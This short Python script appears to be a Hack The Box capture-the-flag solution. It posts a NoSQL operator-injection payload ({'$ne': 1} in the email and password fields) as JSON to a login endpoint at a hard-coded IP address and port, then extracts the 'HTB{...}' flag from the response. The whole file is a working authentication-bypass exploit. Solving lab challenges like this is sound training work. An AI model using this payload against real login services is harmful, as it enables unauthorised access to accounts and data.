#!/usr/bin/python3
from re import findall

from requests import post

url = "http://94.237.49.11:59381/login"

headers = {"Content-Type": "application/json"}

data = {
    "email": { "$ne": 1 }, 
    "password": { "$ne": 1 }
}

r = post(url, headers=headers, json=data)

flag = findall("HTB{.*}", r.text)[0]

print(flag)